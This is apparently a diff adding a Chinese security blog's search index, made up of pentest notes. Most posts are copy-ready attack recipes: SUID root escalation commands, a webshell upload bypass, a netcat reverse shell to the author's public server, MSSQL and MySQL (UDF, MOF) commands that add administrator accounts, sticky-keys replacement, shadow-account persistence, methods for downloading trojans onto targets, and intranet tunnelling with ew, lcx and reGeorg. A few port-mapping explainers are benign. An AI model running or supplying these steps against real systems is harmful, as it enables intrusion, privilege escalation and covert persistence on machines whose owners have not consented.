+    <content type="text"><![CDATA[0x01 SUID什么是suid？通俗的理解为其他用户执行这个程序的时候可以用该程序所有者/组的权限。 0x02 SUID提权那么什么是suid提权呢？我理解的就是有个文件，它有s标志，并且他输入root，那么我们运行这个程序就可以有了root的权限，并且这个程序还得能执行命令，不然没什么用处，那么我们就能从普通用户提升到了root权限了。 0x03 常见的可用于suid提权的命令123456789101112131415NmapVimfindBashMoreLessNanocp 0x04 查找符合条件的文件123find / -user root -perm -4000 -print 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 0x05 详细介绍 nmap老版的nmap(2.02-5.21)有相互的功能–interactive123nmap&gt; !shsh-3.2# whoamiroot msf中也有相关的模块1exploit/unix/local/setuid_nmap find 如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。12touch testfind test -exec whoami \; vim 如果vim以SUID运行，就会继承root用户的权限，可以读取系统中所有的文件 12vim/vi:shell bash 12bash -p&gt;# id less/more 12less /etc/passwd!/bin/sh]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>提权</tag>
+        <tag>后渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[记录一次内网渗透]]></title>
+    <url>%2F2018%2F06%2F10%2F%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
+    <content type="text"><![CDATA[在公司进行渗透测试项目，网站是asp的网站，有个上传点，但是上传的后缀名只能是jpg,gif,png，通过00截断绕过，但是文件名不能有asp，因此通过构造形如1aaa.cer%00.jpg 进行绕过。但是发现服务器端会对上传的内容进行危险代码检测，&lt;%是不能存在于里面的，Fuzz了一波后发现如果上传的文件头是GIF89a的话，并且一句话木马不在最后位置就可以进行绕过。成功得到shell 得到shell后发现权限比较低，是iis的 并没有想着提权，而是打算利用ew来把内网先带出来，然后进行内网的进一步扫描 通过tasklist命令，发现存在360杀毒软件，因此找了一个目录，将免杀的工具上传。 上传了一个nc.exe 打算获取一个交互式的shell（菜刀的shell不是交互式的，有的时候不好用）现在我们的公网服务器上执行1nc -lvvp 4444 监听4444端口 然后，在“肉鸡”上执行1nc.exe -e cmd.exe [公网ip] 4444 发现在公网服务器上已经获取了交互式的shell 然后上传免杀的windows版本的ew首先，在公网服务器上执行1./ew -s rcsocks -l 1080 -e 55 然后在“肉鸡”上执行1ew.exe -s rssocks -d [公网ip] -e 55 最后在我们的机器上，在proxychains.conf 添加1socks5 [公网ip] 1080 然后在我们机器上执行1proxychains msfconsole 就可以了，现在我们的msf就相当于在对方的内网当中了，扫一波smb]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[MSSQL提权之sp_oacreate]]></title>
+    <url>%2F2018%2F06%2F10%2FMSSQL%E6%8F%90%E6%9D%83%E4%B9%8Bsp-oacreate%2F</url>
+    <content type="text"><![CDATA[0x01 前提如果xp_cmdshell组件被删除了话，还可以使用sp_oacreate来进行提权。 0x02 开启sp_oacreate开启12exec sp_configure &apos;show advanced options&apos;,1;reconfigure;exec sp_configure &apos;ole automation procedures&apos;,1;recofigure; 关闭123exec sp_configure &apos;show advanced options&apos;,1;reconfigure;exec sp_configure &apos;ole automation procedures&apos;,0;reconfigure;exec sp_configure &apos;show advanced options&apos;,0;reconfigure; 0x03 直接写用户123declare @shell intexec sp_oacreate &apos;wscript.shell&apos;, @shell outexec sp_method @shell, &apos;run&apos; , null, &apos;c:\windows\system32\cmd.exe \c &quot;net user test pinohd123. /add&quot; &apos; 123declare @shell intexec sp_oacreate &apos;shell.application&apos;,@shell outexec sp_oamethod @shell, &apos;shellexecute&apos;, null, &apos;cmd.exe&apos;, &apos;cmd /c net user test pinohd123. /add&apos;, &apos;c:\windows\system32&apos;, &apos;&apos;,&apos;1&apos;; 0x04 其他操作删除文件12345declare @result intdeclare @fso_token intexec sp_oacreate &apos;scripting.filesystemobject&apos;, @fso_token outexec sp_oamethod @fso_token,&apos;deletefile&apos;,null,&apos;c:\1.txt&apos;exec sp_oadestroy @fso_token 复制文件123declare @o intexec sp_oacreate &apos;scripting.filesystemobject&apos;,@o outexec sp_oamethod @o,&apos;copyfile&apos;,null,&apos;c:\1.txt&apos;,&apos;c:\2.txt&apos; 移动文件123declare @o intexec sp_oacreate &apos;scripting.filesystemobject&apos;,@o outexec sp_oamethod @o,&apos;movefile&apos;,null,&apos;c:\1.txt&apos;,&apos;c:\3.txt&apos; 替换粘滞键123456declare @o intexec sp_oacreate &apos;scripting.filesystemobject&apos;, @o outexec sp_oamethod @o,&apos;copyfile&apos;,null,&apos;c:\windows\explorer.exe&apos;, &apos;c:\windows\system32\sethc.exe&apos;declare @oo intexec sp_oacreate &apos;scripting.filesystemobject&apos;, @oo i=outexec sp_oamethod @oo,&apos;copyfile&apos;,null,&apos;c:\windows\system32\sethc.exe&apos;,&apos;c:\windows\system32\dllcache\sethc.exe&apos;]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+        <tag>后渗透</tag>
+        <tag>Mssql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[MSSQL提权之xp_cmdshell]]></title>
+    <url>%2F2018%2F06%2F10%2FMSSQL%E6%8F%90%E6%9D%83%E4%B9%8Bxp-cmdshell%2F</url>
+    <content type="text"><![CDATA[0x01 前提 getshell或者存在sql注入并且能够执行命令。 sql server是system权限，sql server默认就是system权限。 0x02 xp_cmdshell 有了xp_cmdshell的话可以执行系统命令，该组件默认是关闭的，因此需要把它打开。 开启xp_cmdshell12exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;,1;reconfigure; 关闭xp_cmdshell12exec sp_configure &apos;show advanced options&apos;, 1;reconfigure;exec sp_configure &apos;xp_cmdshell&apos;, 0;reconfigure 0x03 提权12exec master..xp_cmdshell &apos;net user test pinohd123. /add&apos; 添加用户test，密码testexec master..xp_cmdshell &apos;net localgroup administrators test add&apos; 添加test用户到管理员组]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+        <tag>后渗透</tag>
+        <tag>Mssql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[MySQL提权之UDF]]></title>
+    <url>%2F2018%2F06%2F10%2FMySQL%E6%8F%90%E6%9D%83%E4%B9%8BUDF%2F</url>
+    <content type="text"><![CDATA[0x01 UDFUDF（user defined function）用户自定义函数，是mysql的一个拓展接口。用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样。 0x02 windows下udf提权的条件 如果mysql版本大于5.1，udf.dll文件必须放置在mysql安装目录的lib\plugin文件夹下/ 如果mysql版本小于5.1， udf.dll文件在windows server 2003下放置于c:\windows\system32目录，在windows server 2000下放置在c:\winnt\system32目录。 掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。 拥有可以将udf.dll写入相应目录的权限。 0x03 提权方法如果是mysql5.1及以上版本，必须要把udf.dll文件放到mysql安装目录的lib\plugin文件夹下才能创建自定义函数。该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录。 接下来就是干货的地方了，反正我遇到下面一些问题的时候谷歌是找不到答案的（幸亏有大佬相助=。= ） udf.dll这个东西对于小白来说是不容易找到的（譬如我），后来才知道原来大名鼎鼎的sqlmap里是有udf.dll文件的，就在sqlmap/udf/mysql/windows目录下，里面有32位和64位，注意：这里的位数是mysql的位数，并不是对方系统的位数。如果你遇到了如图的错误： 那么一定要检查一下是不是位数搞错了，反正我是因为这个错误。 还有一个需要注意的是，sqlmap里的udf.dll是通过异或编码的，使用之前一定要记得解码，解码的工具也在sqlmap中，在sqlmap/extra/cloak目录下的cloak.py就是。解密之后会在当前目录下生成dll文件。 将dll文件复制到mysql的/lib/plugin目录下，执行1create function cmdshell returns string soname &quot;lib_mysqludf_sys.dll&quot;; 结果报错了 那么这里需要注意的是，需要创建udf中存在的函数才可以，可以用十六进制编辑器打开udf.dll，看一下有哪些函数可以创建 大概就是这些了，我们可以使用sys_exec函数成功，然后试验一下： 成功弹出计算器！]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+        <tag>后渗透</tag>
+        <tag>Mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[MySQL提权之MOF]]></title>
+    <url>%2F2018%2F06%2F10%2FMySQL%E6%8F%90%E6%9D%83%E4%B9%8BMOF%2F</url>
+    <content type="text"><![CDATA[0x01 前言Windows管理规范(WMI)提供了如下三种方法编译WMI存储库的托管对象格式（MOF）文件： 将MOF文件执行为命令行参数及Mofcomp.exe文件 使用IMofCompiler接口和$CompileFile方法 拖放到%SystemRoot%\System32\Wbem\MOF文件夹下的MOF文件中 使用MOF提权的前提是当前root账户可以复制文件到%SystemRoot%\System32\Wbem\MOF目录下。 0x02 漏洞利用方法 将一下代码保存为nullevt.mof文件 123456789101112131415161718192021222324#pragma namespace(&quot;\\.\root\subscription&quot;)instance of __EventFilter as $EventFilter&#123;EventNamespace = &quot;Root\\Cimv2&quot;;Name = &quot;filtP2&quot;;Query = &quot;Select * From __InstanceModificationEvent &quot;&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;&quot;And TargetInstance.Second = 5&quot;;QueryLanguage = &quot;WQL&quot;;&#125;;instance of ActiveScriptEventConsumer as $Consumer&#123;Name = &quot;consPCSV2&quot;;ScriptingEngine = &quot;JScript&quot;;ScriptText =&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;;&#125;;instance of __FilterToConsumerBinding&#123;Consumer = $Consumer;Filter = $EventFilter;&#125;; 通过MySQL查询将文件导入 1select load_file(&apos;c:\\recycler\\nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;; 导入后，系统会自动运行该文件。]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+        <tag>后渗透</tag>
+        <tag>Mysql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[权限维持之从隐藏账户到影子账户]]></title>
+    <url>%2F2018%2F06%2F10%2F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E4%BB%8E%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%E5%88%B0%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7%2F</url>
+    <content type="text"><![CDATA[0x01 关于权限维持很多时候，当我们获得到一个windows服务器的权限后，若某天服务器的管理员发现后修补了漏洞，那么我们就可能失去了这台服务器的权限了，因此权限维持就很有必要了，对于windows服务器来说，我们可以添加一个账户，打开它的3389端口，从而维持我们对一个服务器的权限。 0x02 权限维持之简单的账户添加最简单的方法就是用net user来添加账户了，命令如下123456789101112131415161718192021222324252627282930313233343536net user username password /add``` ![](/images/权限维持之从隐藏账户到影子账户1.png)这种添加账户的方法，服务器管理员可以通过**net user**命令很快的发现。## 0x03 权限维持之添加隐藏账户相比上面那个很简单的添加账户，在windows下，如果在用户名后面添加一个$符号的话，那么通过**net user**的方式是看不到的。![](/images/权限维持之从隐藏账户到影子账户2.png)我们可以看到，我添加的test1$用户是看不到的，不过这种情况也是可以通过管理界面下看到的。键入Win+R，输入compmgmt.msc，打开管理界面，然后在右侧的本地用户和组中，双击用户可以看到我们之前添加的test1$用户。![image.png](/images/权限维持之从隐藏账户到影子账户3.png)## 0x04 权限维持之添加影子账户影子账户，顾名思义就像影子一样，跟主体是一模一样的，通过建立影子账户，可以获得跟管理员一样的权限，还不容易被发现。首先，创建一个隐藏账户，test2$![](/images/权限维持之从隐藏账户到影子账户4.png)然后，键入Win+R，然后输入regedit，打开注册表，找到HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/选项，![](/images/权限维持之从隐藏账户到影子账户5.png)这里面有很多相同格式的字符串的名字还有一个Names的菜单，点击Names，可以看到计算机中所有的账户名称，选中我们刚才创建的test2$账户，可以看到右侧是0x3f4![](/images/权限维持之从隐藏账户到影子账户6.png)记住这个十六进制数字然后返回上层，找到000003F4，这个是一会我们要做的事情，同理，找到Administrator的十六进制数字，我这里是1f4，故而打开000001F4![](/images/权限维持之从隐藏账户到影子账户7.png)我们可以看到有三个选项，双击F，复制里面的所有内容，然后打开刚才说的000003F4，双击F，将刚才复制的内容粘贴上去，保存。之后，分别右键Names中的test2$和000003F4两个目录，选择导出，将注册表导出。接下来，我们打开命令行，输入 net user test2$ /del`删除创建的用户 再双击刚才导出的两个注册表，这样影子账户就创建好了。 然后我们看一下net user 看不到test2$账户。 再打开管理界面中的本地组和用户好的，还是看不到test2$ 最后打开注册表看一下可以看到，存在test2$，影子账号创建完毕！]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>后渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Windows7升级powershell2到powershell3]]></title>
+    <url>%2F2018%2F06%2F10%2FWindows7%E5%8D%87%E7%BA%A7powershell2%E5%88%B0powershell3%2F</url>
+    <content type="text"><![CDATA[0x01 前言最近在学习Windows渗透，其实说白了就是学习各种Windows的特性，昨天接触到了一款powershell渗透框架， 叫做nishang，学习的过程中发现脚本就是不执行，后来才发现是因为我用的虚拟机是windows7，默认的powershell版本是2.0，而nishang需要的是powershell 3.0以上才可以使用，故而记录一下我升级的历程。 0x02 历程首先，win+r，输入appwiz.cpl，点击左侧的已安装的更新，看一下你的计算机中是否安装了Microsoft Windows Management Framework 3.0 Beta (KB2506143)，如果有的话就先把他卸载了。 然后在微软官网上下载.NET 4.0或者.NET 4.5 最后安装Microsoft Windows Management Framework 3.0的6.1内核版本安装文件，链接：http://download.microsoft.com/download/E/7/6/E76850B8-DA6E-4FF5-8CCE-A24FC513FD16/Windows6.1-KB2506143-x64.msu 这就安装完成了，可以打开powershell，输入命令1get-host 查看powershell版本。]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>后渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[渗透中15种文件下载的方法]]></title>
+    <url>%2F2018%2F06%2F10%2F%E6%B8%97%E9%80%8F%E4%B8%AD15%E7%A7%8D%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[0x01 PowerShell 文件下载12$p = new-object system.net.webclient$p.downloadfile(&quot;http://xx.xx.xx.xx\file&quot;,&quot;c:\xxx\xx\file&quot;) 当然也可以直接将上面语句写入到一个脚本中，比如test.ps1然后powershell window中1.test.ps1 执行。 当然，默认情况下是无法执行powershell脚本的，需要在管理员权限下修改配置1powershell set-executionpolicy unrestricted 0x02 Visual Basic 文件下载123456789101112Set args = Wscript.ArgumentsUrl = &quot;http://192.168.43.68:8000/1.py&quot;dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)xHttp.Open &quot;GET&quot;, Url, FalsexHttp.Sendwith bStrm .type = 1 &apos; .open .write xHttp.responseBody .savetofile &quot; C:\users\pino\file\1.py&quot;, 2 &apos;end with 将上述代码保存在test.vbs然后使用1cscript test.vbs 执行文件下载 0x03 Perl 文件下载1perl -MLWP::Simple -e &apos;getstore (&quot;http://www.163.com/&quot;,&quot;163.html&quot;)&apos; 0x04 Python 文件下载1python -c &quot;import urllib2;u=urllib2.urlopen(&quot;http://xx.xxx.xx/1.py&quot;);localfile=open(&apos;c:\users\pino\file\1.py&apos;,&apos;w&apos;);localfile.write(u.read());localfile.close();&quot; 0x05 Ruby 文件下载123456789#!ruby#!/usr/bin/rubyrequire &apos;net/http&apos;Net::HTTP.start(&quot;www.domain.com&quot;) &#123; |http|r = http.get(&quot;/file&quot;)open(&quot;save_location&quot;, &quot;wb&quot;) &#123; |file|file.write(r.body)&#125;&#125; 0x06 PHP 文件下载123456&lt;?$data = @file(&quot;http://xx.xx.xx/1.py&quot;);$f = fopen(&quot;c:\users\pino\1.py&quot;, &quot;w&quot;);fwrite($f, $data[0]);fclose($f);?&gt; 0x07 FTP文件下载我们可以将想要执行的命令先写入一个txt中，然后用ftp命令就好了1.txt 12345open 127.0.0.1user_nameuser_passget file(文件名)quit 然后在命令行中执行1ftp -i -s:1.txt 0x08 TFTP 文件下载windows7 下默认是没有tftp的，可以WIN+R，然后输入appwiz.cpl，点击左侧的打开或关闭windows功能后，选中TFTP客户端即可启用TFTP客户端。 1tftp -i host(本地的，这里可以是127.0.0.1) GET c:\users\pino\1.py(用于保存在本地的文件名) xxx.xx.xxx.xxx\1.py(远程tftp服务器上的文件) 0x09 bitsadmin 文件下载bitsadmin是windows下的一个命令行工具1bitsadmin /transfer name(这个随便写，是任务名称) http://192.168.43.68:8000/1.py c:\users\pino\1.py 0xA Wget 文件下载1wget http://192.168.43.68:8000/1.py 0xB netcat 文件下载攻击者在linux下输入命令1cat file|nc -l 1234 这样把文件file的内容重定向到了攻击者的1234端口，无论谁访问攻击者的ip的这个端口，都能下载到文件了 1nc host_ip 1234 &gt; file 0xC Windows 共享 文件下载1net use x: \\192.156.1.17\temp$ &quot;password&quot; /user:username $符号这里是在本地隐藏，写不写都行 0x0D Notepad 文件下载这个姿势很神奇。首先打开notepad，就是我们常说的记事本，点击文件-》打开，在文件名称内输入完整的URL，回合，就会发现记事本中的内容就是我们访问的URL的文本内容。 0x0E 使用powershell nishang 进行文件下载nishang 是一个很不错的powershell渗透框架，在github上能够找到，里面有很多实用的渗透脚本，这里我们可以用ExeToText脚本，将想要下载的exe文件转换成txt，在用记事本打开，然后复制其中的内容，通过rdp剪贴板复制到目标机器上的txt文本，再通过TextToExe脚本转换为exe就好了。 0x0F 实用csc工具实现类文件下载通常在渗透的过程中我们下载是为了将我们的木马传到目标机器上，因此我们可以另转思路，将木马的源码写好，直接在目标及其上编译就好了。在Windows下，c的编译器默认是在C:\Windows\Microsoft.NET\framework\version，version的话，不同位数的机器不一样，看情况而定，里面的csc.exe就是了。使用下面的命令1csc.exe /out:c:\users\pino\evil.exe c:\users\pino\evil.c]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>后渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[绕过CDN获取真实IP]]></title>
+    <url>%2F2018%2F06%2F10%2F%E7%BB%95%E8%BF%87CDN%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP%2F</url>
+    <content type="text"><![CDATA[0x01 CDN在渗透过程中，经常会遇到网站使用了CDN，而CDN的虚假ip往往会给我们造成各种困难，这里我搜集了很多资料，总结一下关于绕过CDN获取真实IP的方法。 0x02 识别CDN那么在绕过CDN之前，必须要先识别网站是否使用了CDN 不同地区ping网站 对于一个域名来说，如果我们使用不同地区的ip来ping它，如果得到的ip是不一样的，那么就可以判断出它使用了CDN了，因为CDN是一种遵循就近原则的机制。 使用多地ping服务 http://ping.chinaz.com/ http://ping.aizhan.com/ http://ce.cloud.360.cn/ http://tools.fastweb.com.cn/Index/Ping 使用nslookup 如果返回了多个ip可以判断使用了CDN 使用在线网站查询 http://www.cdnplanet.com/tools/cdnfinder/ http://www.ipip.net/ip.html 0x03 绕过CDN nslookup法 1nslookup www.xxx.com 8.8.8.8 格式是 nslookup 主域名 国外冷门的dns由于国内很多CDN提供商可能只提供国内服务，而对国外不提供服务，因此通过国外的dns就可能解析到真实的ip（注：这里8.8.8.8不算是国外冷门dns） 查看历史dns记录 可以通过查看历史的dns记录来判断真实ip，因为在使用CDN之前应该就是真实的ip在线查询网站： https://toolbar.netcraft.com/site_report https://dnsdb.io/zh-cn/ https://x.threatbook.cn/ http://toolbar.netcraft.com/site_report?url= http://viewdns.info/ 查询子域名 很多时候，由于CDN服务比较昂贵，因此一些网站只给主站配置了CDN服务，因此可以谷歌子域名，看看对应ip是不是 使用国外ip解析域名 其实原理跟nslookup方法差不多，如果有国外的vps的话，直接ping域名，看看能否有真实ip 目标敏感文件泄漏 通过网站的一些敏感文件，或者phpinfo之类的探针来获取真实ip RSS订阅 邮件订阅 有的服务器本地自带sendmail（邮件传输代理程序）注册之后，会主动发一封邮件给我们，打开邮件的源代码,你就能看到服务器的真实ip了。有的大型互联网网站会有自己的Mailserver.但是应该会在一个网段，扫下C段地址就行。 DDOS把CDN流量打完，就有真实IP了（不可取） 想办法让网站访问我们自己的服务器，从日志中获取真实ip 利用命令执行漏洞啊，ssrf等等]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>CDN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[利用VMware进行端口映射（模拟外网访问内网）]]></title>
+    <url>%2F2018%2F06%2F10%2F%E5%88%A9%E7%94%A8VMware%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%EF%BC%88%E6%A8%A1%E6%8B%9F%E5%A4%96%E7%BD%91%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[0x01 实验材料两台笔记本，vmware workstation软件，安装好的ubuntu虚拟机并且搭建好了web服务 0x02 开始我在ubuntu虚拟机里搭建了web服务器，并在/var/www/html目录下新建了phpinfo.php，代码如下123&lt;?phpphpinfo();?&gt; 我在ubuntu本地访问一下，成功 这里我的web端口设为了8088，不是默认的80端口 然后就要开始设置vmware了。选择编辑 -&gt; 虚拟机网络编辑器，选择VMnet8，类型是NAT模式，配置如图 这里重点是NAT设置中的端口转发选项，主机端口6666，当然也可以是别的端口，虚拟机IP地址设置为ubuntu虚拟机的ip地址（这里我把虚拟机的ip地址设置为了静态的IP了，方便做实验嘛~如何设置可以到我的Linux文集中找到相关文章） 设置好了NAT设置之后，还要在虚拟机设置中把网络连接选项为自定义模式，并选择VMnet8，具体如下图 最后，笔记本开启热点，点击右下角的wifi图标，有个网络设置（win10是这样的） 我另一台笔记本已经连接上热点了，ip地址为192.168.137.134，这里当作外网ip，然后这里我是将开启热点的电脑当作一台路由器了，ip地址通过ipconfig命令查看，是192.168.137.1，然后通过访问1http://192.168.137.1:6666/phpinfo.php 就发现访问到了处于内网的web服务器了！ 然后本次实验的网络拓扑图可以理解为这样： 因此可以说明通过端口映射是可以满足外网访问内网的需求的。]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>端口映射</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[端口映射]]></title>
+    <url>%2F2018%2F06%2F10%2F%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%2F</url>
+    <content type="text"><![CDATA[0x01 端口映射什么是端口映射呢？端口映射就是将外网IP映射到内网IP，使得外网用户通过访问这个外网IP就能够获得对应的内网服务器的服务，这么说可能比较抽象，下面会说的更详细一些。 如上面我画的图片，这里假设内网用户访问百度。那么这里正常来说内网用户是无法访问处于外网的百度服务器的，但是譬如校园网，明明是在局域网内，但是为什么还是可以访问百度呢？这里就用到了端口映射了。 实际上，我们所处的内网中，通常有一个“出口”，就是网关，它可能是路由器，或者交换机之类的东西，而他通过端口映射来让我们访问外网。具体地说： 拿路由器为例，路由器至少有两种类型的插口，一个LAN口，一个WAN口，大家可以那一个路由器看一看，这里LAN口是连我们自己的电脑的，而WAN口，在家里的话就是连宽带的那根线，那么我们的电脑就是在内网中了——一个由路由器形成的内网环境。当我们要访问百度的时候，实际上路由器中会形成一个端口映射关系，就像图中那样，我们的内网IP对应外网IP的一个端口，不同的端口可以使得很多内网用户与外网做映射，这样就形成了一一对应的关系了，因此访问百度的时候，百度也就可以知道谁访问了它，然后将响应返回给内网用户。 而当外网用户想要访问内网服务器的时候，也是用过端口映射关系，通过访问外网IP加特定的端口，就可以直接访问到跟那个端口有映射关系的内网IP了。 0x02 端口映射分类端口映射可以分为两类，动态映射、静态映射。感觉关系有点像DHCP分配IP地址一样，动态的就是当映射关系会在一方关机之后，下次再连接的时候，映射关系会改变。而静态端口映射就是绑定了映射关系，就算关机重启之后绑定的关系还是不会变的。]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>端口映射</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[利用lcx进行访问内网]]></title>
+    <url>%2F2018%2F06%2F10%2F%E5%88%A9%E7%94%A8lcx%E8%BF%9B%E8%A1%8C%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%2F</url>
+    <content type="text"><![CDATA[0x01 前言这周开始准备学习内网渗透的知识，昨天利用Vmware搭建了域环境，今天做了一个小实验，利用lcx端口转发来访问内网服务器。这里需要一个外网ip，所以去阿里云买了一个服务器，学生价9.9一个月还是挺不错的~ 0x02 操作环境内网服务器ip：192.168.80.3 端口3389外网ip：x.x.x.x 端口：51（这里需要注意的是购买阿里云服务器之后一定要在安全组里定义一个开放入口的端口，否则的话是连接不到的，我就被坑了很久。。） 0x03 具体步骤首先这里假设已经拿到了服务器的webshell了，那么就上传一个lcx.exe到肉鸡上，在终端输入1lcx.exe -slave x.x.x.x 51 192.168.80.3 3389 这里意思就是将内网192.168.80.3的3389端口转发到外网x.x.x.x的51端口 然后再本机上（注意这里本机需要外网ip，否则会失败）的终端输入1lcx.exe -listen 51 10000 这里意思是在本机上监听51端口并连接到10000端口（可以用别的端口）本机需要10000端口是没有被其他程序使用的，可以使用命令：1netstat -an 查看 最后win+R，输入mstsc打开远程桌面，输入127.0.0.1:10000就可以连接到肉鸡了~~ P.S 要有一个需要注意的是，做实验的时候，肉鸡记得把远程桌面功能打开呀！ ##0x04 参考文献 http://www.freebuf.com/sectool/126967.html]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[利用netsh进行端口转发]]></title>
+    <url>%2F2018%2F06%2F10%2F%E5%88%A9%E7%94%A8netsh%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
+    <content type="text"><![CDATA[0x01 简介NetSH (Network Shell) 是windows系统本身提供的功能强大的网络配置命令行工具。故我们可以使用netsh进行内网端口转发。思考了一下，发现这个是当我们进入内网的时候可以使用这个工具，好像外网访问内网是不行的（我觉得是这样的(╯▽╰ )），但是lcx就可以外网访问内网呀~ 0x02 使用方法添加端口转发1234netsh interface portproxy add v4tov4 listenaddress=&lt;ip&gt; listenport=&lt;port&gt; connectaddress=&lt;ip&gt; connectport=&lt;port&gt;netsh interface portproxy add v4tov6 listenaddress=&lt;ip&gt; listenport=&lt;port&gt; connectaddress=&lt;ip&gt; connectport=&lt;port&gt;netsh interface portproxy add v6tov4 listenaddress=&lt;ip&gt; listenport=&lt;port&gt; connectaddress=&lt;ip&gt; connectport=&lt;port&gt;netsh interface portproxy add v6tov6 listenaddress=&lt;ip&gt; listenport=&lt;port&gt; connectaddress=&lt;ip&gt; connectport=&lt;port&gt; 查看已经设置的端口转发12345netsh interface portproxy show allnetsh interface portproxy show v4tov4netsh interface portproxy show v4tov6netsh interface portproxy show v6tov4netsh interface portproxy show v6tov6 修改已经设置的端口转发1234netsh interface portproxy set v4tov4 listenport=&lt;port&gt;netsh interface portproxy set v6tov4 listenport=&lt;port&gt;netsh interface portproxy set v4tov6 listenport=&lt;port&gt;netsh interface portproxy set v6tov6 listenport=&lt;port&gt; 删除已经设置的端口转发1234netsh interface portproxy delete v4tov4 listenport=&lt;port&gt;netsh interface portproxy delete v6tov4 listenport=&lt;port&gt;netsh interface portproxy delete v4tov6 listenport=&lt;port&gt;netsh interface portproxy delete v6tov6 listenport=&lt;port&gt;]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+        <tag>端口转发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[利用reGeog和proxifier进行内网渗透]]></title>
+    <url>%2F2018%2F06%2F10%2F%E5%88%A9%E7%94%A8reGeog%E5%92%8Cproxifier%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
+    <content type="text"><![CDATA[0x01 reGeorg网上说reGeorg是reDuh的继承者，但是表示reDuh没有用过。。。下载的话Github上有，大概就是这样子滴 0x02 proxifierproxifier就是一个代理工具吧，官网下载后安装就好了 0x03 具体实验这里我选择tunnel.php，将该文件上传到服务器端（已经geshell了），访问一下 有这个表示成功了 然后再本地自己的机器上运行reGeorg中的python文件，命令格式大概是1python reGeorgSocksProxy.py -p 8888 -u http://x.x.x.x/tunnel.php 运行成功后大概是这样子的 然后就是配置proxifier了。首先打开proxifier，选择Profile -&gt; Proxy Server -&gt; add，填写信息如下 注意这里的端口号要与之前的运行python脚本中的port参数一致，然后保存一下然后选择Profile -&gt; ProxificationRules 注意这里被选中的蓝色部分，后面的Action为Direct，默认情况就是这个，检查一下就好了。然后第一行的python.exe第一次使用是没有的，用过后就会出现了，所以没看到的小伙伴不要担心~ 配置好了之后，点击屏幕左下角的开始菜单，输入mstsc，会出现mstsc，右键它，并选择Proxifier -&gt;Proxy Socks5 127.0.0.1 弹出远程桌面的登陆框，输入内网ip即可！]]></content>
